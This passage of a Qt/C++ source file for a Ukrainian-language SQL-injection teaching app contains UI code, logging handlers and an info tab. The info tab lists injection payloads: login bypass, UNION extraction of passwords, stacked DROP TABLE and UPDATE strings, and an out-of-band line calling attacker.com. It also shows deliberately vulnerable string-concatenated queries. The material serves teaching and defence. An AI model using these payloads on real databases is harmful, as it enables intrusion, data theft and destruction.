    logs_filterCombo->addItem("Stacked Queries (TRUNCATE)", "STACKED-QUERY (TRUNCATE)");
    logs_filterCombo->addItem("Stacked Queries (ALTER)", "STACKED-QUERY (ALTER)");
    logs_filterCombo->addItem("Stacked Queries (CREATE)", "STACKED-QUERY (CREATE)");
    logs_filterCombo->addItem("Stacked Queries (INSERT INTO USERS)", "STACKED-QUERY (INSERT INTO USERS)");
    logs_filterCombo->addItem("Comment-based", "COMMENT-BASED");
    logs_filterCombo->addItem("Time-based", "TIME-BASED");
    logs_filterCombo->addItem("Suspicious Characters", "SUSPICIOUS-CHARACTERS");
    logs_filterCombo->addItem("SQL Keywords", "SQL-KEYWORDS");
    logs_filterCombo->addItem("Unknown", "UNKNOWN");
    connect(logs_filterCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
            this, &MainWindow::onFilterLogs);
    controlLayout->addWidget(logs_filterCombo);

    controlLayout->addStretch();

    // Кнопка оновлення
    logs_refreshBtn = new QPushButton("Оновити", this);
    logs_refreshBtn->setMinimumHeight(35);
    logs_refreshBtn->setStyleSheet(
        "QPushButton {"
        "   background: #00CED1;"
        "   color: black;"
        "   font-weight: bold;"
        "   border-radius: 5px;"
        "   padding: 0 20px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #00E5E8; }"
        );
    connect(logs_refreshBtn, &QPushButton::clicked,
            this, &MainWindow::onRefreshLogs);
    controlLayout->addWidget(logs_refreshBtn);

    // Кнопка очищення.
    logs_clearBtn = new QPushButton("Очистити логи", this);
    logs_clearBtn->setMinimumHeight(35);
    logs_clearBtn->setStyleSheet(
        "QPushButton {"
        "   background: #dc2626;"
        "   color: white;"
        "   font-weight: bold;"
        "   border-radius: 5px;"
        "   padding: 0 20px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #ef4444; }"
        );
    connect(logs_clearBtn, &QPushButton::clicked,
            this, &MainWindow::onClearLogs);
    controlLayout->addWidget(logs_clearBtn);

    mainLayout->addLayout(controlLayout);

    // ========== ТАБЛИЦЯ ЛОГІВ ==========
    logs_tableWidget = new QTableWidget(this);
    logs_tableWidget->setColumnCount(7);
    logs_tableWidget->setHorizontalHeaderLabels({
        "ID", "Тип атаки", "Ввід користувача", "Заблоковано",
        "Час", "IP", "Додаткова інфо"
    });
    logs_tableWidget->setAlternatingRowColors(true);
    logs_tableWidget->horizontalHeader()->setStretchLastSection(true);
    logs_tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
    logs_tableWidget->setEditTriggers(QAbstractItemView::NoEditTriggers);

    mainLayout->addWidget(logs_tableWidget);

    // ========== СТАТИСТИКА ==========
    QGroupBox* statsGroup = new QGroupBox("Статистика атак", this);
    statsGroup->setMaximumHeight(200);
    QVBoxLayout* statsLayout = new QVBoxLayout(statsGroup);

    logs_statisticsEdit = new QTextEdit(this);
    logs_statisticsEdit->setReadOnly(true);
    logs_statisticsEdit->setStyleSheet(
        "QTextEdit {"
        "   background: #2a2a2a;"
        "   color: #e0e0e0;"
        "   border: none;"
        "   font-family: 'Courier New', monospace;"
        "   font-size: 11px;"
        "}"
        );
    statsLayout->addWidget(logs_statisticsEdit);

    mainLayout->addWidget(statsGroup);

    // Завантаження логів при відкритті вкладки.
    onRefreshLogs();

    return tab;
}

/*
 * ============================================================================
 * ВКЛАДКА 6: ІНФОРМАЦІЯ ПРО SQL-ІН'ЄКЦІЇ
 * ============================================================================
 */

QWidget* MainWindow::createInfoTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(10);

    // ========== ЗАГОЛОВОК ==========
    QLabel* titleLabel = new QLabel("Інформація про SQL-ін'єкції", this);
    titleLabel->setStyleSheet(
        "QLabel {"
        "   font-size: 18px;"
        "   font-weight: bold;"
        "   color: #00CED1;"
        "   padding: 10px;"
        "}"
        );
    titleLabel->setAlignment(Qt::AlignCenter);
    mainLayout->addWidget(titleLabel);

    // ========== ТЕКСТОВЕ ПОЛЕ З ІНФОРМАЦІЄЮ ==========
    info_textEdit = new QTextEdit(this);
    info_textEdit->setReadOnly(true);
    info_textEdit->setStyleSheet(
        "QTextEdit {"
        "   background: #2a2a2a;"
        "   color: #e0e0e0;"
        "   border: 2px solid #3a3a3a;"
        "   border-radius: 8px;"
        "   padding: 20px;"
        "   font-size: 13px;"
        "   line-height: 1.6;"
        "}"
        );

    // Формуємо текст з детальною інформацією.
    QString infoText = R"(
═══════════════════════════════════════════════════════════════════
ЩО ТАКЕ SQL-ІН'ЄКЦІЯ?
═══════════════════════════════════════════════════════════════════

SQL-ін'єкція (SQL Injection) - це тип атаки на веб-додатки, при якій
зловмисник вставляє (ін'єктує) шкідливий SQL-код у запит до бази даних.

Це одна з найпопулярніших та найнебезпечніших вразливостей веб-додатків,
яка займає топові позиції у рейтингу OWASP Top 10.


═══════════════════════════════════════════════════════════════════
ЧОМУ ЦЕ НЕБЕЗПЕЧНО?
═══════════════════════════════════════════════════════════════════

Успішна SQL-ін'єкція може призвести до:

✗ Обходу автентифікації (вхід без паролю)
✗ Витоку конфіденційних даних (паролі, персональні дані)
✗ Зміни або видалення даних (UPDATE, DELETE)
✗ Виконання адміністративних операцій (DROP TABLE)
✗ Отримання контролю над сервером БД
✗ Завантаження шкідливих файлів


═══════════════════════════════════════════════════════════════════
ТИПИ SQL-ІН'ЄКЦІЙ
═══════════════════════════════════════════════════════════════════

1. Boolean-based (Логічна)
   Використання: OR 1=1, AND 1=1
   Приклад: admin' OR '1'='1
   Результат: Обхід перевірок через завжди-правдиві умови

2. UNION-based (Об'єднання)
   Використання: UNION SELECT
   Приклад: ' UNION SELECT username, password FROM users --
   Результат: Витік даних з інших таблиць

3. Error-based (Через помилки)
   Використання: Провокування SQL помилок
   Приклад: ' AND 1=CONVERT(int, @@version) --
   Результат: Отримання інформації через повідомлення про помилки

4. Time-based (Часова)
   Використання: SLEEP(), WAITFOR DELAY
   Приклад: ' OR SLEEP(5) --
   Результат: Детекція вразливості через затримки

5. Stacked Queries (Множинні запити)
   Використання: Виконання декількох команд через ;
   Приклад: '; DROP TABLE users; --
   Результат: Виконання додаткових SQL команд

6. Out-of-band (Зовнішній канал)
   Використання: DNS/HTTP запити з БД
   Приклад: '; EXEC xp_dirtree '//attacker.com/a'
   Результат: Передача даних через зовнішні канали


═══════════════════════════════════════════════════════════════════
МЕТОДИ ЗАХИСТУ
═══════════════════════════════════════════════════════════════════

1. PREPARED STATEMENTS

   ВРАЗЛИВИЙ КОД:
   QString query = "SELECT * FROM users WHERE username='" + username + "'";

   ЗАХИЩЕНИЙ КОД:
   QSqlQuery query;
   query.prepare("SELECT * FROM users WHERE username=:username");
   query.bindValue(":username", username);

   Чому безпечно? БД автоматично екранує всі спецсимволи!


2. ВАЛІДАЦІЯ ВХІДНИХ ДАНИХ

   • Перевірка типів (int, double, email тощо)
   • Обмеження довжини (max length)
   • Дозволені символи (regex)
   • Whitelist для обмежених наборів


3. LEAST PRIVILEGE (Мінімальні привілеї)

   • Обліковий запис БД з мінімальними правами
   • Тільки SELECT для read-only операцій
   • Заборона DROP, ALTER для веб-додатків


4. WAF (Web Application Firewall)

   • Фільтрація підозрілих запитів
   • Блокування відомих патернів атак
   • Логування спроб зламу


5. ЕКРАНУВАННЯ

   • Екранування спецсимволів: ', ", \, --, тощо
   • Проблема: легко забути або зробити помилку
   • Використовуйте тільки як додатковий захист


═══════════════════════════════════════════════════════════════════
ПРИКЛАДИ КОДУ
═══════════════════════════════════════════════════════════════════

ВРАЗЛИВИЙ КОД (Qt/C++):

QString username = usernameEdit->text();
QString password = passwordEdit->text();

// НЕБЕЗПЕЧНО: Пряме підставлення!
QString queryString = QString(
    "SELECT * FROM users WHERE username='%1' AND password='%2'"
).arg(username).arg(password);

QSqlQuery query;
query.exec(queryString);  // Можна зламати!


ЗАХИЩЕНИЙ КОД (Qt/C++):

QString username = usernameEdit->text();
QString password = passwordEdit->text();

// БЕЗПЕЧНО: Prepared Statement!
QSqlQuery query;
query.prepare("SELECT * FROM users WHERE username=:user AND password=:pass");
query.bindValue(":user", username);   // Автоматичне екранування
query.bindValue(":pass", password);   // Автоматичне екранування
query.exec();


═══════════════════════════════════════════════════════════════════
ПРИКЛАДИ АТАК (Для тестування цього застосунку)
═══════════════════════════════════════════════════════════════════

Вкладка "Авторизація":
   • admin' OR '1'='1
   • admin'--
   • ' OR 1=1--

Вкладка "Пошук":
   • %' UNION SELECT id, username, password, role, '1', 1.0, 'leaked', '000' FROM users --
   • %' OR '1'='1

Вкладка "Фільтрація":
   • Інформатика' OR '1'='1
   • ' OR 1=1 --

Вкладка "Коментарі":
   • Test'); DROP TABLE students; --
   • Good'); UPDATE students SET grade=5.0; --

═══════════════════════════════════════════════════════════════════
ПРО ЗАСТОСУНОК
═══════════════════════════════════════════════════════════════════

Цей застосунок демонструє різницю між вразливим та захищеним кодом.

Архітектура:
  • Qt 6 + C++
  • SQLite база даних
  • VulnerableQueries - вразливі запити
  • SecureQueries - захищені запити
  • AttackLogger - система логування атак

═══════════════════════════════════════════════════════════════════
)";

    info_textEdit->setPlainText(infoText);

    mainLayout->addWidget(info_textEdit);

    return tab;
}

/*
 * ============================================================================
 * ОБРОБНИКИ ПОДІЙ (SLOTS)
 * ============================================================================
 */

void MainWindow::onVulnerableLogin()
{
    QString username = login_usernameEdit->text();
    QString password = login_passwordEdit->text();

    if (username.isEmpty() || password.isEmpty()) {
        login_resultEdit->setPlainText(
            "❌ ПОМИЛКА\n\n"
            "Заповніть обидва поля!"
            );
        return;
    }

    bool success = VulnerableQueries::vulnerableLogin(username, password);
    QString attackType = AttackLogger::detectAttackPattern(username + " " + password);
    bool isAttack = !attackType.isEmpty();

    QString result;
    if (success) {
        result = QString(
                     "✅ ВХІД УСПІШНИЙ!\n\n"
                     "════════════════════════════════════════\n\n"
                     "Логін: %1\n"
                     "Пароль: %2\n\n"
                     ).arg(username).arg(QString(password.length(), '*'));

        if (isAttack) {
            result += QString(
                          "⚠️ АТАКА ВИЯВЛЕНА!\n\n"
                          "Тип: %1\n\n"
                          "У вразливій версії атакуючий може:\n"
                          "• Увійти без правильного пароля\n"
                          "• Отримати доступ до будь-якого акаунту\n"
                          "• Обійти всю систему автентифікації\n\n"
                          ).arg(attackType);

            AttackLogger::logAttack(
                attackType,
                "VULNERABLE LOGIN",
                username + " / " + password,
                false,
                "Login bypass successful"
                );
        } else {
            result += "Це легітимний вхід з правильними даними.";
        }
    } else {
        result = QString(
                     "❌ ВХІД НЕВДАЛИЙ\n\n"
                     "════════════════════════════════════════\n\n"
                     "Невірний логін або пароль.\n\n"
                     "Логін: %1\n"
                     "Пароль: %2\n"
                     ).arg(username).arg(QString(password.length(), '*'));

        if (isAttack) {
            result += QString(
                          "\n⚠️ Виявлено спробу атаки!\n"
                          "Тип: %1\n\n"
                          "Але атака не спрацювала через синтаксичну помилку SQL."
                          ).arg(attackType);
        }
    }

    login_resultEdit->setPlainText(result);
    statusBar()->showMessage(
        isAttack ? "⚠️ SQL-ін'єкція виявлена!" : "✓ Спроба входу виконана",
        5000
        );
}

void MainWindow::onSecureLogin()
{
    QString username = login_usernameEdit->text();
    QString password = login_passwordEdit->text();

    if (username.isEmpty() || password.isEmpty()) {
        login_resultEdit->setPlainText(
            "❌ ПОМИЛКА\n\n"
            "Заповніть обидва поля!"
            );
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(username + " " + password);
    bool isAttack = !attackType.isEmpty();

    bool success = SecureQueries::secureLogin(username, password);

    QString result;
    if (success) {
        result = QString(
                     "✅ ВХІД УСПІШНИЙ!\n\n"
                     "════════════════════════════════════════\n\n"
                     "Логін: %1\n"
                     "Пароль: %2\n\n"
                     "✓ Це легітимний вхід з правильними даними.\n"
                     "✓ Prepared Statements працюють коректно!"
                     ).arg(username).arg(QString(password.length(), '*'));
    } else {
        result = QString(
                     "❌ ВХІД НЕВДАЛИЙ\n\n"
                     "════════════════════════════════════════\n\n"
                     "Невірний логін або пароль.\n\n"
                     "Логін: %1\n"
                     "Пароль: %2\n"
                     ).arg(username).arg(QString(password.length(), '*'));

        if (isAttack) {
            result += QString(
                          "\n🛡️ АТАКА ЗАБЛОКОВАНА!\n\n"
                          "Виявлено спробу: %1\n\n"
                          "Prepared Statements автоматично екранували\n"
                          "всі спецсимволи. SQL-ін'єкція неможлива!\n\n"
                          "Система шукає користувача з точним\n"
                          "ім'ям \"%2\" (включно з лапками та OR).\n\n"
                          ).arg(attackType).arg(username);

            AttackLogger::logAttack(
                attackType,
                "SECURE LOGIN (BLOCKED)",
                username + " / " + password,
                true,
                "Attack blocked by Prepared Statements"
                );
        }
    }

    login_resultEdit->setPlainText(result);
    statusBar()->showMessage(
        isAttack ? "🛡️ Атака заблокована!" : "✓ Спроба входу виконана",
        5000
        );
}

void MainWindow::onVulnerableSearch()
{
    QString searchTerm = search_termEdit->text();

    if (searchTerm.isEmpty()) {
        search_infoLabel->setText("Введіть пошуковий термін!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(searchTerm);
    bool isAttack = !attackType.isEmpty();

    QVector<Student> results = VulnerableQueries::vulnerableSearchStudents(searchTerm);
    displayStudentsInTable(results, search_resultsTable);

    QString info = QString("Знайдено записів: %1").arg(results.size());
    if (isAttack) {
        info += QString(" | ⚠️ АТАКА: %1 | ❌ НЕ ЗАБЛОКОВАНО").arg(attackType);

        AttackLogger::logAttack(
            attackType,
            "VULNERABLE SEARCH",
            searchTerm,
            false,
            QString("Returned %1 records (possible data leak)").arg(results.size())
            );
    }

    search_infoLabel->setText(info);
    statusBar()->showMessage(
        isAttack ? "⚠️ Можливий витік даних!" : "✓ Пошук виконано",
        5000
        );
}

void MainWindow::onSecureSearch()
{
    QString searchTerm = search_termEdit->text();

    if (searchTerm.isEmpty()) {
        search_infoLabel->setText("Введіть пошуковий термін!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(searchTerm);
    bool isAttack = !attackType.isEmpty();

    QVector<Student> results = SecureQueries::secureSearchStudents(searchTerm);
    displayStudentsInTable(results, search_resultsTable);

    QString info = QString("Знайдено записів: %1").arg(results.size());
    if (isAttack) {
        info += QString(" | 🛡️ АТАКА ЗАБЛОКОВАНА: %1").arg(attackType);

        AttackLogger::logAttack(
            attackType,
            "SECURE SEARCH (BLOCKED)",
            searchTerm,
            true,
            QString("Returned %1 records (no leak)").arg(results.size())
            );
    }

    search_infoLabel->setText(info);
    statusBar()->showMessage(
        isAttack ? "🛡️ Атака заблокована!" : "✓ Пошук виконано",
        5000
        );
}

void MainWindow::onVulnerableFilter()
{
    QString faculty;
    if (!filter_customEdit->text().trimmed().isEmpty()) {
        faculty = filter_customEdit->text().trimmed();
    } else if (filter_facultyCombo->currentIndex() > 0) {
        faculty = filter_facultyCombo->currentText();
    } else {
        QMessageBox::warning(this, "Помилка", "Виберіть або введіть факультет!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(faculty);
    bool isAttack = !attackType.isEmpty();

    QVector<Student> results = VulnerableQueries::vulnerableFilterByFaculty(faculty);
    displayStudentsInTable(results, filter_resultsTable);

    if (isAttack) {
        AttackLogger::logAttack(
            attackType,
            "VULNERABLE FILTER",
            faculty,
            false,
            QString("Returned %1 records (filter bypassed)").arg(results.size())
            );
    }

    statusBar()->showMessage(
        QString("✓ Знайдено: %1 студентів%2")
            .arg(results.size())
            .arg(isAttack ? " | ⚠️ АТАКА!" : ""),
        5000
        );
}

void MainWindow::onSecureFilter()
{
    QString faculty;
    if (!filter_customEdit->text().trimmed().isEmpty()) {
        faculty = filter_customEdit->text().trimmed();
    } else if (filter_facultyCombo->currentIndex() > 0) {
        faculty = filter_facultyCombo->currentText();
    } else {
        QMessageBox::warning(this, "Помилка", "Виберіть або введіть факультет!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(faculty);
    bool isAttack = !attackType.isEmpty();

    QVector<Student> results = SecureQueries::secureFilterByFaculty(faculty);
    displayStudentsInTable(results, filter_resultsTable);

    if (isAttack) {
        AttackLogger::logAttack(
            attackType,
            "SECURE FILTER (BLOCKED)",
            faculty,
            true,
            "Whitelist validation + Prepared Statements"
            );
    }

    statusBar()->showMessage(
        QString("✓ Знайдено: %1 студентів%2")
            .arg(results.size())
            .arg(isAttack ? " | 🛡️ ЗАБЛОКОВАНО!" : ""),
        5000
        );
}

void MainWindow::onVulnerableComment()
{
    int studentId = comment_studentIdEdit->text().toInt();
    QString commentText = comment_textEdit->toPlainText().trimmed();
    int rating = comment_ratingCombo->currentData().toInt();

    if (commentText.isEmpty()) {
        comment_resultEdit->setPlainText("Введіть текст коментаря!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(commentText);
    bool isAttack = !attackType.isEmpty();

    bool success = VulnerableQueries::vulnerableAddComment(studentId, commentText, rating);

    QString result;
    if (success) {
        result = QString(
                     "✅ ОПЕРАЦІЯ ВИКОНАНА\n\n"
                     "════════════════════════════════════════\n\n"
                     "ID студента: %1\n"
                     "Рейтинг: %2 ⭐\n"
                     "Текст: %3\n\n"
                     ).arg(studentId).arg(rating).arg(commentText);

        if (isAttack) {
            QString upperText = commentText.toUpper();
            bool isDangerous = upperText.contains("DROP") ||
                               upperText.contains("DELETE") ||
                               upperText.contains("UPDATE");

            if (isDangerous) {
                result += QString(
                              "КРИТИЧНА ВРАЗЛИВІСТЬ!\n\n"
                              "Тип атаки: %1\n\n"
                              "УВАГА: Небезпечна SQL команда була виконана.\n\n"
                              "У вразливій версії SQL-ін'єкція може:\n"
                              "• Виконати додаткові команди (DROP, UPDATE, DELETE)\n"
                              "• Змінити або ВИДАЛИТИ дані в БД\n"
                              "• Видалити цілі таблиці\n"
                              "• Зруйнувати цілісність бази даних\n\n"
                              ).arg(attackType);
            } else {
                result += QString(
                              "⚠️ АТАКА ВИЯВЛЕНА: %1\n\n"
                              "У вразливій версії SQL-ін'єкція може:\n"
                              "• Виконати додаткові команди (DROP, UPDATE)\n"
                              "• Змінити дані в БД\n"
                              "• Видалити таблиці\n\n"
                              ).arg(attackType);
            }

            AttackLogger::logAttack(
                attackType,
                "VULNERABLE COMMENT",
                commentText,
                false,
                "Stacked query executed successfully"
                );
        }
    } else {
        result = "❌ Помилка: Не вдалося виконати жодної SQL команди";
    }

    comment_resultEdit->setPlainText(result);
    statusBar()->showMessage(
        isAttack ? "⚠️ Спроба stacked query виконана!" : "✓ Коментар додано",
        5000
        );
}

void MainWindow::onSecureComment()
{
    int studentId = comment_studentIdEdit->text().toInt();
    QString commentText = comment_textEdit->toPlainText().trimmed();
    int rating = comment_ratingCombo->currentData().toInt();

    if (commentText.isEmpty()) {
        comment_resultEdit->setPlainText("Введіть текст коментаря!");
        return;
    }

    QString attackType = AttackLogger::detectAttackPattern(commentText);
    bool isAttack = !attackType.isEmpty();

    bool success = SecureQueries::secureAddComment(studentId, commentText, rating);

    QString result;
    if (success) {
        result = QString(
                     "✅ КОМЕНТАР БЕЗПЕЧНО ДОДАНО\n\n"
                     "════════════════════════════════════════\n\n"
                     "ID студента: %1\n"
                     "Рейтинг: %2 ⭐\n"
                     "Текст: %3\n\n"
                     ).arg(studentId).arg(rating).arg(commentText);

        if (isAttack) {
            result += QString(
                          "🛡️ АТАКА ЗАБЛОКОВАНА: %1\n\n"
                          "Prepared Statements зберегли текст без виконання!\n"
                          "DROP, UPDATE та інші команди трактуються як текст.\n\n"
                          "✓ Безпека гарантована!\n"
                          "✓ Дані збережені коректно!\n"
                          "✓ SQL-ін'єкція неможлива!"
                          ).arg(attackType);

            AttackLogger::logAttack(
                attackType,
                "SECURE COMMENT (BLOCKED)",
                commentText,
                true,
                "Text stored as-is, no execution"
                );
        }
    } else {
        result = "❌ Помилка: не пройдено валідацію";
    }

    comment_resultEdit->setPlainText(result);
    statusBar()->showMessage(
        isAttack ? "🛡️ Атака заблокована!" : "✓ Коментар додано",
        5000
        );
}

void MainWindow::onRefreshLogs()
{
    logs_filterCombo->setCurrentIndex(0);

    QVector<AttackLog> logs = AttackLogger::getAllLogs();

    logs_tableWidget->setRowCount(0);

    for (const AttackLog& log : logs) {
        int row = logs_tableWidget->rowCount();
        logs_tableWidget->insertRow(row);

        logs_tableWidget->setItem(row, 0, new QTableWidgetItem(QString::number(log.id)));
        logs_tableWidget->setItem(row, 1, new QTableWidgetItem(log.attackType));
        logs_tableWidget->setItem(row, 2, new QTableWidgetItem(log.userInput));

        QTableWidgetItem* blockedItem = new QTableWidgetItem(
            log.isBlocked ? "ТАК" : "НІ"
            );
        blockedItem->setForeground(log.isBlocked ? QColor("#4ade80") : QColor("#ef4444"));
        logs_tableWidget->setItem(row, 3, blockedItem);

        logs_tableWidget->setItem(row, 4, new QTableWidgetItem(
                                              log.timestamp.toString("yyyy-MM-dd HH:mm:ss")
                                              ));
        logs_tableWidget->setItem(row, 5, new QTableWidgetItem(log.ipAddress));
        logs_tableWidget->setItem(row, 6, new QTableWidgetItem(log.additionalInfo));
    }

    logs_tableWidget->resizeColumnsToContents();

    logs_statisticsEdit->setPlainText(AttackLogger::getAttackStatistics());

    statusBar()->showMessage(QString("✓ Завантажено %1 логів").arg(logs.size()), 3000);
}

void MainWindow::onFilterLogs(int index)
{
    QString filterType = logs_filterCombo->itemData(index).toString();

    qDebug() << "[LOGS] Filter changed to:" << filterType << "(index:" << index << ")";

    QVector<AttackLog> logs;

    if (filterType.isEmpty()) {
        logs = AttackLogger::getAllLogs();
        qDebug() << "[LOGS] Loading ALL logs";
    } else {
        logs = AttackLogger::getLogsByType(filterType);
        qDebug() << "[LOGS] Loading logs of type:" << filterType;
    }

    qDebug() << "[LOGS] Found" << logs.size() << "logs";

    logs_tableWidget->setRowCount(0);

    for (const AttackLog& log : logs) {
        int row = logs_tableWidget->rowCount();
        logs_tableWidget->insertRow(row);

        logs_tableWidget->setItem(row, 0, new QTableWidgetItem(QString::number(log.id)));
        logs_tableWidget->setItem(row, 1, new QTableWidgetItem(log.attackType));
        logs_tableWidget->setItem(row, 2, new QTableWidgetItem(log.userInput));

        QTableWidgetItem* blockedItem = new QTableWidgetItem(
            log.isBlocked ? "ТАК" : "НІ"
            );
        blockedItem->setForeground(log.isBlocked ? QColor("#4ade80") : QColor("#ef4444"));
        logs_tableWidget->setItem(row, 3, blockedItem);

        logs_tableWidget->setItem(row, 4, new QTableWidgetItem(
                                              log.timestamp.toString("yyyy-MM-dd HH:mm:ss")
                                              ));
        logs_tableWidget->setItem(row, 5, new QTableWidgetItem(log.ipAddress));
        logs_tableWidget->setItem(row, 6, new QTableWidgetItem(log.additionalInfo));
    }

    logs_tableWidget->resizeColumnsToContents();

    logs_statisticsEdit->setPlainText(AttackLogger::getAttackStatistics());

    QString statusMessage;
    if (filterType.isEmpty()) {
        statusMessage = QString("✓ Показано всі логи (%1 записів)").arg(logs.size());
    } else {
        statusMessage = QString("✓ Фільтр: %1 (%2 записів)").arg(filterType).arg(logs.size());
    }

    statusBar()->showMessage(statusMessage, 3000);
}

void MainWindow::onClearLogs()
{
    QMessageBox::StandardButton reply = QMessageBox::question(
        this,
        "Підтвердження",
        "Ви впевнені, що хочете видалити ВСІ логи?\n\nЦю дію неможливо скасувати!",
        QMessageBox::Yes | QMessageBox::No
        );

    if (reply == QMessageBox::Yes) {
        int deleted = AttackLogger::clearOldLogs(0);
        QMessageBox::information(this, "Успіх",
                                 QString("Видалено %1 логів").arg(deleted));
        onRefreshLogs();
    }
}

void MainWindow::displayStudentsInTable(const QVector<Student>& students,
                                        QTableWidget* table)
{
    table->setRowCount(0);
    table->setColumnCount(8);
    table->setHorizontalHeaderLabels({
        "ID", "Ім'я", "Прізвище", "Факультет",
        "Курс", "Оцінка", "Email", "Телефон"
    });

    for (const Student& student : students) {
        int row = table->rowCount();
        table->insertRow(row);

        table->setItem(row, 0, new QTableWidgetItem(QString::number(student.id)));
        table->setItem(row, 1, new QTableWidgetItem(student.firstName));
        table->setItem(row, 2, new QTableWidgetItem(student.lastName));
        table->setItem(row, 3, new QTableWidgetItem(student.faculty));
        table->setItem(row, 4, new QTableWidgetItem(QString::number(student.course)));
        table->setItem(row, 5, new QTableWidgetItem(QString::number(student.grade, 'f', 1)));
        table->setItem(row, 6, new QTableWidgetItem(student.email));
        table->setItem(row, 7, new QTableWidgetItem(student.phone));
    }

    table->resizeColumnsToContents();
}
